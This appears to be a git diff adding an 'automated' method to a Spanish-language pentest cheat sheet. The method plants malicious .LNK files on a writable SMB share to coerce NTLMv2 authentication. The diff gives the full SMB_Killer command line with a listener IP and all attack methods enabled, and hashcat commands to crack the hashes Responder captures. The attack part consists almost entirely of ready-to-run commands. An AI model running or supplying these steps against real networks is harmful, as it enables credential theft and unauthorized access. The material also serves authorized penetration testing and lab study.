@@ -17,6 +17,37 @@ El objetivo es provocar que un usuario/equipo que interactúe con el recurso gen
 > [!IMPORTANT]
 > `READ` permite enumerar/leer el recurso, pero **`WRITE` es el permiso importante para plantar el `.LNK`**.
 
+
+---
+# Forma 1: Automatizada
+## SMBKiller 
+
+* [SMBKiller.py](https://github.com/overgrowncarrot1/SMB_Killer)
+
+```bash 
+❯ python3 SMB_Killer.py -r Target_IP -l IP_Kali -d domain.corp -i tun0 -a FileShare -U '' -P '' -A
+
+	# -a = Nombre del directorio que tiene el permiso 'WRITE' 
+	# -U = Nombre del usuario (Si es necesario)
+	# -P = Contraseña del usuario (Si es necesario)
+	# -r = The remote target's IP address
+	# -l = The attacker's listening IP address (your VPN IP)
+	# -d = The Active Directory domain name
+	# -i = The attacker's network interface (e.g., tun0 for a VPN)
+	# -s = The writable SMB share name (in this case, share)
+	# -A = A flag to use all available attack methods (various file types)
+```
+
+## Cracking 
+
+```bash 
+# Crackear el hast obtenido del 'Responder' 
+❯ hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt --force 
+❯ hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt --force -r /usr/share/hashcat/rules/best66.rule
+```
+
+---
+# Forma 2: Manual 
 ## Attack Flow
 
 ```text
@@ -71,3 +102,4 @@ Paso 4:
 ❯ hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt --force 
 ❯ hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt --force -r /usr/share/hashcat/rules/best66.rule
 ```
+
